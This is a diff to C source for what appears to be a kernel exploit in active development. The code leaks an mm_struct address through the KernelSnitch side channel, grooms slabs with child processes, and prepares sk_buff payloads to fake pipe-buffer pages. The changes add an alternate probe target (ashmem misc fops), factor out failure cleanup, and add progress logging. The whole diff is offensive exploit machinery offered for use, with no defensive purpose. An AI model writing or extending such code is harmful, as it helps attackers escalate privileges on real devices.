@@ -568,9 +568,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
         } else if (slot == P0_ORACLE_PROBE_SLOT) {
-          uintptr_t direct_addr =
-              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
-              P0_ORACLE_PROBE_OFFSET;
+          uintptr_t direct_addr;
+          if (p0_virtual_base_probe) {
+            direct_addr = data_addr(ASHMEM_MISC_FOPS);
+          } else {
+            direct_addr = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
+                          P0_ORACLE_PROBE_OFFSET;
+          }
           parent = direct_to_page(direct_addr);
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
@@ -741,6 +745,20 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+static void cleanup_failed_kernel_page(const char *reason) {
+  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
+  kernelsnitch_cleanup(ks);
+  ks = NULL;
+  pr_info("kernel page cleanup failure=%s stage=kernelsnitch done\n", reason);
+  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
+          reason, prepare_ctx.mm_cnt);
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    kill_child(prepare_ctx.childs[i]);
+  }
+  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
+  cleanup_page_prepare_state();
+}
+
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
@@ -803,12 +821,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("KernelSnitch collision finding failed\n");
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
+    cleanup_failed_kernel_page("collision");
     return 0;
   }
 
@@ -816,12 +829,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
+    cleanup_failed_kernel_page("mm-leak");
     return 0;
   }
 
@@ -829,12 +837,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ);
   if (!prepare_skb_payload(base, payload_mode)) {
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
+    cleanup_failed_kernel_page("skb-payload");
     return 0;
   }
 
@@ -916,9 +919,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
           reclaim_sent, reclaim_sends, payload_mode);
+  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
+          payload_mode, base);
   kernelsnitch_cleanup(ks);
   ks = NULL;
+  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
+          payload_mode);
 
+  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
+          prepare_ctx.mm_cnt);
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     if (prepare_ctx.memfds[i] >= 0) {
       SYSCHK(close(prepare_ctx.memfds[i]));
@@ -928,7 +937,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
       prepare_ctx.childs[i] = -1;
     }
+    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
+        i + 1 == prepare_ctx.mm_cnt) {
+      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
+              i + 1, prepare_ctx.mm_cnt);
+    }
   }
+  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
+          base);
 
   return base;
 }
